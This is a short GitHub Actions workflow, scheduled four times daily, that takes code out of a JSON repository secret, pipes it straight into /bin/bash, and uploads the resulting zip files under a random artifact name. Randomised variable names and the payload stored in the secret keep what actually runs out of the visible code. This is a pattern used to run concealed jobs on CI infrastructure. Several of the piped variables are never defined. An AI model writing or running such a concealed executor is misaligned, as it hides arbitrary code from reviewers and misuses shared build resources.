name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '28 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  task:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Execute
        env:
          es6: ${{ secrets.es6 }}
        run: |
          printf '%s' "$es6" | jq -r .hl7 | /bin/bash
          echo $kw69 | jq -r .qzi65 | /bin/bash
          echo $efpg61 | jq -r .tu70 | /bin/bash
          echo $r06704 | jq -r .ouf23 | /bin/bash
          echo $jznot93690 | jq -r .regl32 | /bin/bash
          printf '%s' "$bswwc25970" | jq -r .sxeph8 | /bin/bash

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mulSdmoU
          path: "*.zip"
          retention-days: 1
